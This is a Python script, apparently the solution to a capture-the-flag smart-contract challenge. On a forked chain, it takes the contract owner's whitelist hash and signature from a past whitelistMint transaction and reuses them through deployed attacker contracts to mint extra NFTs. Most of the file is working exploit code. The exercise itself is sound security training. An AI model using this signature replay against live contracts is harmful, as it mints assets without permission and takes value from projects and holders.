from ape import accounts, project, chain, Contract
from .utils.helper import fork, get_block, w3, send_tx

BLOCK = 7439186
V_NFT_CONTRACT = "0xC357c220D9ffe0c23282fCc300627f14D9B6314C"


"""
MethodID: 0x692972ea => function signature
[0]:  00000000000000000000000002f6f75dab5f046b6ac1bf4cf01df99b6237addf => first param: address (to)
[1]:  0000000000000000000000000000000000000000000000000000000000000001 => second param: uint256 (qty)
[2]:  d54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54 => third param: bytes32 (hash)
[3]:  0000000000000000000000000000000000000000000000000000000000000080 => byte offset for fourth param: bytes (signature)
[4]:  0000000000000000000000000000000000000000000000000000000000000041 => length of signature param
[5]:  f80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c => 'r' value (bytes32)
[6]:  24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a95 => 's' value (bytes32)
[7]:  1c00000000000000000000000000000000000000000000000000000000000000 => 'v' value (uint8)
"""


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    nft = Contract(V_NFT_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    sig_length = 65

    function_sig = w3.keccak(
        text="whitelistMint(address,uint256,bytes32,bytes)",
    )[:4].hex()

    for tx in chain.provider.get_transactions_by_block(BLOCK):
        if tx.sender == nft.owner() and tx.data[:4].hex() == function_sig:
            tx_params = tx.data[4:]
            break
    hash = tx_params[64:96]

    signature = tx_params[160 : 160 + sig_length]

    bytecode = project.VNFTAttacker.contract_type.get_deployment_bytecode().hex()

    target = send_tx("", bytecode).contractAddress

    project.VNFTAttackerHelper.deploy(
        target,
        nft.address,
        hash,
        signature,
        sender=attacker,
    )

    # --- AFTER EXPLOIT --- #
    print(
        f"\n--- After exploit: You minted {nft.balanceOf(attacker.address)} NFTs ---\n"
    )

    assert nft.balanceOf(attacker.address) > 2

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
